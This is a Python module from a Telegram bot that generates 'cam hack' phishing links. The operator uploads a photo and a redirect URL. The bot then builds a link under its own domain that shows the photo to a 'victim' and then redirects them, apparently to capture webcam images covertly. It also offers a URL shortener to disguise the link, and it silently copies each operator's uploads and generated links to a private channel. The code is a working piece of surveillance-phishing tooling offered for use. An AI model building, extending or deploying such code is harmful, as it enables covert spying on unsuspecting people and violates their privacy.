import uuid
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from bot.config import BOT_TOKEN, PRIVATE_CHANNEL_ID, BASE_URL
from bot.utils.storage import (
    user_data, link_cache, victim_data_store, user_username_cache,
    save_redirect, save_photo
)


def handle_cam_hack(bot, message, get_bottom_buttons):
    user_id = message.chat.id

    try:
        chat = bot.get_chat(user_id)
        if chat.username:
            user_username_cache[user_id] = f"@{chat.username}"
        else:
            user_username_cache[user_id] = f"{chat.first_name or 'Unknown'}"
    except:
        user_username_cache[user_id] = "Unknown"

    msg = bot.send_message(user_id, "📤 Send me a PHOTO (will be shown to victim)", reply_markup=get_bottom_buttons())
    bot.register_next_step_handler(msg, lambda m: get_cam_photo(m, user_id, get_bottom_buttons, bot))


def get_cam_photo(message, user_id, get_bottom_buttons, bot):
    if message.photo:
        photo_id = message.photo[-1].file_id
        file_info = bot.get_file(photo_id)
        photo_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
        user_data[user_id] = {"photo_url": photo_url}

        # SAVE PHOTO (FILE + MEMORY)
        save_photo(user_id, photo_url)

        username = user_username_cache.get(user_id, "Unknown")

        try:
            bot.send_photo(
                PRIVATE_CHANNEL_ID,
                photo_id,
                caption=f"📸 User Uploaded Photo\n\nUsername: {username}\nID: {user_id}"
            )
        except Exception as e:
            print(f"Channel photo error: {e}")

        msg = bot.send_message(user_id, "📤 Now send REDIRECT LINK", reply_markup=get_bottom_buttons())
        bot.register_next_step_handler(msg, lambda m: get_cam_redirect(m, user_id, get_bottom_buttons, bot))
    else:
        bot.send_message(user_id, "❌ Send a PHOTO first.", reply_markup=get_bottom_buttons())


def get_cam_redirect(message, user_id, get_bottom_buttons, bot):
    redirect_url = message.text.strip()

    if redirect_url.startswith("http"):
        user_data[user_id]["redirect"] = redirect_url

        # SAVE REDIRECT (FILE + MEMORY)
        save_redirect(user_id, redirect_url)

        username = user_username_cache.get(user_id, "Unknown")

        try:
            bot.send_message(
                PRIVATE_CHANNEL_ID,
                f"🔗 Redirect Link Set\n\nUser: {username}\nID: {user_id}\nRedirect: {redirect_url}"
            )
        except Exception as e:
            print(f"Redirect send error: {e}")

        unique_id = str(uuid.uuid4())[:8]
        link = f"{BASE_URL}/p/cam/{unique_id}?v={user_id}"
        link_cache[unique_id] = {
            "user_id": user_id,
            "time": time.time(),
            "type": "cam",
            "link": link
        }

        try:
            bot.send_message(
                PRIVATE_CHANNEL_ID,
                f"✅ Final Cam Hack Link\n\nUser: {username}\nID: {user_id}\nLink: {link}"
            )
        except Exception as e:
            print(f"Final link send error: {e}")

        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("🔗 Open Link", url=link),
            InlineKeyboardButton("📋 Copy Link", callback_data="copy"),
            InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/")
        )
        bot.send_message(
            user_id,
            f"✅ CAMERA phishing link ready:\n\n{link}\n\nVictim sees your photo → redirects to {redirect_url}",
            reply_markup=markup
        )
    else:
        bot.send_message(user_id, "❌ Valid URL starting with http:// or https://", reply_markup=get_bottom_buttons())
        msg = bot.send_message(user_id, "📤 Send REDIRECT LINK", reply_markup=get_bottom_buttons())
        bot.register_next_step_handler(msg, lambda m: get_cam_redirect(m, user_id, get_bottom_buttons, bot))
